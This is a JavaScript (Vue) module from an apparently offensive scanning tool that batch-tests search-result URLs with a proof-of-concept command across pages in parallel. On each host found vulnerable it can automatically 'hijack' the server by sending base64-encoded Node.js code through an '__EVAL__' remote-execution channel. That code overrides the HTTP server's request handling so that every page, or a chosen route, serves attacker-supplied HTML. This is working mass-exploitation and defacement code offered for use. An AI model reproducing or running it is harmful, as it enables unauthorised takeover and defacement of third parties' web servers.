/**
 * 批量验证功能 Composable
 * 负责批量 POC 验证逻辑
 */
import { ref, nextTick, unref } from 'vue'
import { useI18n } from 'vue-i18n'

export function useBatchVerify(
  batchSettings,
  searchResultsCache,
  currentPage,
  totalPages,
  autoHijackEnabled
) {
  const { t } = useI18n()
  const batchVerifying = ref(false)
  const batchVerifyPaused = ref(false)
  const batchVerifyStats = ref({
    total: 0,
    safe: 0,
    vulnerable: 0,
    error: 0,
    hijacked: 0,
    hijackFailed: 0
  })
  const currentHighlightedRow = ref(null)
  const resultsBodyRef = ref(null)
  const isChangingPage = ref(false) // 防止重复触发页面切换
  const consecutiveEmptyPages = ref(0) // 连续空页面计数器

  // 清除之前高亮的行
  const clearHighlightedRow = () => {
    if (currentHighlightedRow.value) {
      currentHighlightedRow.value.style.backgroundColor = ''
      currentHighlightedRow.value = null
    }
  }

  // 滚动到正在验证的行
  const scrollToVerifyingRow = async (rowIndex) => {
    try {
      await nextTick()
      await new Promise((resolve) => setTimeout(resolve, 150))

      if (!resultsBodyRef.value) {
        console.log('[滚动] resultsBodyRef 不存在')
        return
      }

      const rows = resultsBodyRef.value.querySelectorAll('.results-table tbody tr')
      console.log(`[滚动] 找到 ${rows.length} 行，尝试滚动到第 ${rowIndex} 行`)

      if (!rows || rows.length === 0) {
        console.log('[滚动] 未找到表格行')
        return
      }

      if (rowIndex >= rows.length) {
        console.log(`[滚动] 行索引超出范围: ${rowIndex} >= ${rows.length}`)
        return
      }

      const targetRow = rows[rowIndex]
      if (!targetRow) {
        return
      }

      clearHighlightedRow()

      targetRow.style.transition = 'background-color 0.3s ease'
      targetRow.style.backgroundColor = 'rgba(33, 150, 243, 0.2)'
      currentHighlightedRow.value = targetRow

      const scrollContainer = resultsBodyRef.value

      const rowOffsetTop = targetRow.offsetTop
      const containerHeight = scrollContainer.clientHeight
      const rowHeight = targetRow.clientHeight

      const targetScrollTop = rowOffsetTop - containerHeight / 2 + rowHeight / 2

      console.log('[滚动] 容器高度:', containerHeight)
      console.log('[滚动] 行偏移:', rowOffsetTop)
      console.log('[滚动] 目标滚动位置:', targetScrollTop)
      console.log('[滚动] 当前滚动位置:', scrollContainer.scrollTop)

      scrollContainer.scrollTo({
        top: Math.max(0, targetScrollTop),
        behavior: 'smooth'
      })

      console.log('[滚动] ✓ 滚动命令已执行')
    } catch (error) {
      console.error('[滚动] 滚动失败:', error)
    }
  }

  // 添加到漏洞历史记录
  const addToVulnHistory = async (url) => {
    try {
      console.log('正在保存漏洞历史:', url)
      const result = await window.api.storage.addHistoryItem(url)
      if (result.success) {
        console.log('✓ 漏洞历史保存成功')
      } else {
        console.error('✗ 漏洞历史保存失败:', result.error)
      }
    } catch (error) {
      console.error('保存漏洞历史失败:', error)
    }
  }

  // Base64 编码函数
  const base64Encode = (str) => {
    return btoa(unescape(encodeURIComponent(str)))
  }

  // 生成劫持代码
  const generateHijackCode = (route, html) => {
    const escapedHtml = html.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$')

    if (route === '*') {
      // 全局劫持
      return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(\`${escapedHtml}\`);return true;}}return global.__originalEmit.apply(this,arguments);};})();`
    } else {
      // 指定路由劫持
      return `(async()=>{const h=await import('node:http');const u=await import('node:url');if(!global.__originalEmit){global.__originalEmit=h.Server.prototype.emit;}if(!global.__hijackRoutes){global.__hijackRoutes=new Map();}global.__hijackRoutes.set('${route}',\`${escapedHtml}\`);h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(q.method==='GET'&&global.__hijackRoutes.has(p.pathname)){s.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});s.end(global.__hijackRoutes.get(p.pathname));return true;}}return global.__originalEmit.apply(this,arguments);};})();`
    }
  }

  // 执行劫持
  const executeHijack = async (url, settings) => {
    try {
      // 加载批量劫持模板（独立于 POC 劫持模板）
      const result = await window.api.storage.loadSettings()
      let hijackHtml = ''

      if (result.success && result.settings?.batchHijackHtmlCache) {
        hijackHtml = result.settings.batchHijackHtmlCache
      } else {
        // 使用统一的默认模板
        const { getDefaultHijackTemplate } = await import('../config/hijackTemplate')
        hijackHtml = getDefaultHijackTemplate()
      }

      const route = settings.hijackRouteMode === 'global' ? '*' : settings.hijackTargetRoute
      const hijackCode = generateHijackCode(route, hijackHtml)
      const base64Code = base64Encode(hijackCode)
      const command = `__EVAL__:${base64Code}`

      const hijackResult = await window.api.executePOC(url, command)

      if (hijackResult.success && hijackResult.data.is_vulnerable) {
        console.log('✓ 劫持成功:', url)
        return true
      } else {
        console.error('✗ 劫持失败:', url, hijackResult.error)
        return false
      }
    } catch (error) {
      console.error('劫持错误:', error)
      return false
    }
  }

  // 执行批量验证的核心逻辑（多线程版本）
  const executeBatchVerify = async (loadPageData) => {
    try {
      const startPageNum = currentPage.value
      const totalPagesCount = totalPages.value

      // 只验证当前页
      const currentPageNum = startPageNum

      console.log(`[批量验证] 开始验证第 ${currentPageNum} 页，总页数: ${totalPagesCount}`)
      console.log(`[批量验证] 缓存状态:`, !!searchResultsCache.value[currentPageNum])

      // 如果当前页没有缓存数据，尝试加载
      if (!searchResultsCache.value[currentPageNum]) {
        console.log(`[批量验证] 第 ${currentPageNum} 页无缓存，开始加载数据...`)
        try {
          await loadPageData(currentPageNum)
          console.log(`[批量验证] 第 ${currentPageNum} 页数据加载完成`)

          // 等待数据真正写入缓存（最多等待3秒）
          let retryCount = 0
          while (
            !searchResultsCache.value[currentPageNum] &&
            retryCount < 30 &&
            batchVerifying.value
          ) {
            console.log(
              `[批量验证] 等待第 ${currentPageNum} 页数据写入缓存... (${retryCount + 1}/30)`
            )
            await new Promise((resolve) => setTimeout(resolve, 100))
            retryCount++
          }

          console.log(
            `[批量验证] 第 ${currentPageNum} 页缓存检查完成，有数据: ${!!searchResultsCache.value[currentPageNum]}`
          )
        } catch (error) {
          console.error(`[批量验证] 加载第 ${currentPageNum} 页失败:`, error)
          // 加载失败，停止验证
          clearHighlightedRow()
          return {
            success: false,
            error: `加载第 ${currentPageNum} 页失败: ${error.message}`
          }
        }

        // 加载后再次检查是否有数据
        if (
          !searchResultsCache.value[currentPageNum] ||
          searchResultsCache.value[currentPageNum].length === 0
        ) {
          console.log(`[批量验证] 第 ${currentPageNum} 页加载后仍然没有数据，可能已到达最后`)
          // 加载成功但没有数据，说明已经到达实际的最后一页
          clearHighlightedRow()
          return {
            success: true,
            message: `批量验证完成！安全: ${batchVerifyStats.value.safe}, 漏洞: ${batchVerifyStats.value.vulnerable}, 错误: ${batchVerifyStats.value.error}`
          }
        }
      }

      const pageResults = searchResultsCache.value[currentPageNum] || []
      const threadCount = batchSettings.value.threadCount || 1

      console.log(`[批量验证] 第 ${currentPageNum} 页共有 ${pageResults.length} 条数据`)

      // 获取所有待验证的项
      const pendingItems = pageResults
        .map((item, index) => ({ item, index }))
        .filter(({ item }) => item.pocStatus === 'pending')

      console.log(`[批量验证] 第 ${currentPageNum} 页有 ${pendingItems.length} 条待验证项`)

      // 如果当前页没有待验证的项，跳转到下一页或结束
      if (pendingItems.length === 0) {
        console.log(`当前页 ${currentPageNum} 没有待验证项`)
        consecutiveEmptyPages.value++

        // 如果连续3页都没有待验证项，或者已经是最后一页，停止验证
        if (consecutiveEmptyPages.value >= 3 || currentPageNum >= totalPagesCount) {
          console.log(`连续 ${consecutiveEmptyPages.value} 页没有待验证项或已到最后一页，验证结束`)
          consecutiveEmptyPages.value = 0
          clearHighlightedRow()
          return {
            success: true,
            message: `批量验证完成！安全: ${batchVerifyStats.value.safe}, 漏洞: ${batchVerifyStats.value.vulnerable}, 错误: ${batchVerifyStats.value.error}`
          }
        }

        // 如果还有下一页，自动跳转
        if (currentPageNum < totalPagesCount && batchVerifying.value && !isChangingPage.value) {
          console.log(`[批量验证] 当前页无待验证项，跳转到下一页 ${currentPageNum + 1}`)
          isChangingPage.value = true

          try {
            const nextPage = currentPageNum + 1

            // 先修改页码
            currentPage.value = nextPage
            await nextTick()

            console.log(
              `[批量验证] 检查第 ${nextPage} 页缓存状态:`,
              !!searchResultsCache.value[nextPage]
            )

            // 等待页面切换动画
            await new Promise((resolve) => setTimeout(resolve, 300))

            isChangingPage.value = false

            console.log(`[批量验证] 递归调用验证第 ${nextPage} 页`)
            // 递归调用，继续验证下一页（会在函数开始时检查并加载数据）
            return await executeBatchVerify(loadPageData)
          } catch (error) {
            isChangingPage.value = false
            consecutiveEmptyPages.value = 0
            throw error
          }
        } else {
          // 没有下一页了，验证完成
          consecutiveEmptyPages.value = 0
          clearHighlightedRow()
          return {
            success: true,
            message: `批量验证完成！安全: ${batchVerifyStats.value.safe}, 漏洞: ${batchVerifyStats.value.vulnerable}, 错误: ${batchVerifyStats.value.error}`
          }
        }
      }

      // 有待验证项，重置连续空页面计数器
      consecutiveEmptyPages.value = 0

      // 多线程验证
      let currentIndex = 0
      const activeThreads = new Set()

      // 验证单个项的函数
      const verifyItem = async ({ item, index }) => {
        if (!batchVerifying.value) {
          return
        }

        item.pocStatus = 'checking'
        batchVerifyStats.value.total++

        // 滚动到最后一个正在验证的项（保持在屏幕中间）
        await scrollToVerifyingRow(index)

        try {
          const response = await window.api.executePOC(
            item.fullUrl,
            batchSettings.value.verifyCommand
          )

          if (!response.success) {
            item.pocStatus = 'error'
            batchVerifyStats.value.error++
            return
          }

          const result = response.data

          if (result.is_vulnerable && result.digest_content) {
            // 先显示存在漏洞状态
            item.pocStatus = 'vulnerable'
            batchVerifyStats.value.vulnerable++
            await addToVulnHistory(item.fullUrl)

            console.log('[批量劫持] 检测到漏洞:', item.fullUrl)
            console.log('[批量劫持] autoHijackEnabled:', unref(autoHijackEnabled))

            // 如果启用了自动劫持，等待1秒后执行劫持
            if (unref(autoHijackEnabled)) {
              console.log('[批量劫持] 开始劫持流程...')
              // 等待1秒
              await new Promise((resolve) => setTimeout(resolve, 1000))

              // 显示正在劫持中状态
              item.pocStatus = 'hijacking'

              // 执行劫持
              const hijackSuccess = await executeHijack(item.fullUrl, batchSettings.value)
              if (hijackSuccess) {
                item.pocStatus = 'hijacked'
                batchVerifyStats.value.hijacked++
                // 漏洞数减1（因为已经劫持了）
                batchVerifyStats.value.vulnerable--
                console.log('✓ 自动劫持成功:', item.fullUrl)
              } else {
                item.pocStatus = 'hijack-failed'
                batchVerifyStats.value.hijackFailed = (batchVerifyStats.value.hijackFailed || 0) + 1
                console.log('✗ 自动劫持失败:', item.fullUrl)
              }
            }
          } else if (result.command_failed || !result.is_vulnerable) {
            if (result.command_failed) {
              item.pocStatus = 'error'
              batchVerifyStats.value.error++
            } else {
              item.pocStatus = 'safe'
              batchVerifyStats.value.safe++
            }
          } else {
            item.pocStatus = 'safe'
            batchVerifyStats.value.safe++
          }
        } catch (error) {
          console.error('POC 验证失败:', error)
          item.pocStatus = 'error'
          batchVerifyStats.value.error++
        }
      }

      // 线程工作函数
      const threadWorker = async (_threadId) => {
        while (currentIndex < pendingItems.length && batchVerifying.value) {
          const itemData = pendingItems[currentIndex]
          currentIndex++

          await verifyItem(itemData)

          // 短暂延迟，避免过快
          await new Promise((resolve) => setTimeout(resolve, 50))
        }
      }

      // 启动多个线程
      const threads = []
      for (let i = 0; i < Math.min(threadCount, pendingItems.length); i++) {
        const thread = threadWorker(i)
        threads.push(thread)
        activeThreads.add(thread)
      }

      // 等待所有线程完成
      await Promise.all(threads)
      clearHighlightedRow()

      // 当前页验证完成后，如果还有下一页，自动跳转
      if (currentPageNum < totalPagesCount && batchVerifying.value && !isChangingPage.value) {
        console.log(
          `[批量验证] 当前页 ${currentPageNum} 验证完成，跳转到下一页 ${currentPageNum + 1}`
        )

        // 设置标志，防止重复触发
        isChangingPage.value = true

        try {
          const nextPage = currentPageNum + 1

          // 先修改页码
          currentPage.value = nextPage
          await nextTick()

          console.log(
            `[批量验证] 检查第 ${nextPage} 页缓存状态:`,
            !!searchResultsCache.value[nextPage]
          )

          // 等待页面切换动画
          await new Promise((resolve) => setTimeout(resolve, 300))

          // 重置标志
          isChangingPage.value = false

          console.log(`[批量验证] 递归调用验证第 ${nextPage} 页`)
          // 递归调用，继续验证下一页（会在函数开始时检查并加载数据）
          return await executeBatchVerify(loadPageData)
        } catch (error) {
          isChangingPage.value = false
          throw error
        }
      }

      if (batchVerifying.value) {
        clearHighlightedRow()
        return {
          success: true,
          message: `批量验证完成！安全: ${batchVerifyStats.value.safe}, 漏洞: ${batchVerifyStats.value.vulnerable}, 错误: ${batchVerifyStats.value.error}`
        }
      }
    } catch (error) {
      console.error('批量验证出错:', error)
      clearHighlightedRow()
      return { success: false, error: error.message }
    } finally {
      // 只有在真正完成验证时才重置状态
      // 如果是用户手动暂停，不应该重置 batchVerifyPaused
      if (batchVerifying.value) {
        batchVerifying.value = false
        batchVerifyPaused.value = false
      }
      isChangingPage.value = false // 重置标志
    }
  }

  // 开始批量验证
  const startBatchVerify = async (loadPageData, showSnackbar) => {
    if (batchVerifying.value) return

    batchVerifying.value = true
    batchVerifyPaused.value = false
    isChangingPage.value = false // 重置标志
    consecutiveEmptyPages.value = 0 // 重置连续空页面计数器

    batchVerifyStats.value = {
      total: 0,
      safe: 0,
      vulnerable: 0,
      error: 0,
      hijacked: 0,
      hijackFailed: 0
    }

    showSnackbar(t('batch.verifying'), 'info')
    const result = await executeBatchVerify(loadPageData)
    if (result) {
      if (result.success) {
        showSnackbar(result.message, 'success')
      } else {
        showSnackbar(`${t('messages.operationFailed')}: ${result.error}`, 'error')
      }
    }
  }

  // 暂停批量验证
  const pauseBatchVerify = (showSnackbar) => {
    batchVerifying.value = false
    batchVerifyPaused.value = true
    isChangingPage.value = false // 重置标志
    clearHighlightedRow()
    showSnackbar(t('messages.operationSuccess'), 'info')
  }

  // 继续批量验证
  const resumeBatchVerify = async (loadPageData, showSnackbar) => {
    batchVerifyPaused.value = false
    batchVerifying.value = true
    isChangingPage.value = false // 重置标志
    consecutiveEmptyPages.value = 0 // 重置连续空页面计数器

    // 注意：恢复时不清空统计信息，保留之前的验证结果
    showSnackbar(t('batch.verifying'), 'info')
    const result = await executeBatchVerify(loadPageData)
    if (result) {
      if (result.success) {
        showSnackbar(result.message, 'success')
      } else {
        showSnackbar(`${t('messages.operationFailed')}: ${result.error}`, 'error')
      }
    }
  }

  // 切换批量验证状态
  const toggleBatchVerify = (loadPageData, showSnackbar) => {
    if (batchVerifying.value) {
      pauseBatchVerify(showSnackbar)
    } else if (batchVerifyPaused.value) {
      resumeBatchVerify(loadPageData, showSnackbar)
    } else {
      startBatchVerify(loadPageData, showSnackbar)
    }
  }

  return {
    batchVerifying,
    batchVerifyPaused,
    batchVerifyStats,
    currentHighlightedRow,
    resultsBodyRef,
    isChangingPage,
    clearHighlightedRow,
    scrollToVerifyingRow,
    addToVulnHistory,
    executeBatchVerify,
    startBatchVerify,
    pauseBatchVerify,
    resumeBatchVerify,
    toggleBatchVerify
  }
}
